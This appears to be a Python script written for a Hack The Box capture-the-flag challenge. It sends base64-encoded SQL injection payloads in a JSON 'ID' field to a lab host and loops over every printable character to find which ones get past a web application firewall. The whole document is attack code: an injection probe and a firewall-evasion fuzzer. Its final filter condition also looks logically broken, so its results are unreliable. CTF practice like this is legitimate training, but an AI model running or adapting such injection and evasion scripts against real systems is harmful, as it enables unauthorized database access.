#!/usr/bin/env python3
import base64
import requests
import string


# {\"ID\":\"' ORDER BY 1--\"}

def b64_wrapper(payload):

    payload = payload.encode('ascii')
    base64_bytes = base64.b64encode(payload)
    b64_encoded_payload = base64_bytes.decode('ascii')

    return b64_encoded_payload


print("checking the following characters for blockages")
print(string.printable)

print("doing test payload to ensure we get blocked\n")

payload = "{\"ID\":\"' ORDER BY 1--\"}"
payload = b64_wrapper(payload)
params = {"obj":payload}
r = requests.get("http://docker.hackthebox.eu:30111", params=params)
print(r.url)
print(r.text)

for character in string.printable:
    payload = "{\"ID\":\"' ORDER BY %s--\"}" % character
    payload = b64_wrapper(payload)

    params = {"obj":payload}
    r = requests.get("http://docker.hackthebox.eu:30111", params=params)
    if r.text.find("mysql") == 0 and r.text.find("This request has been blocked by the server's application firewall") == 0:
        print(r.text)
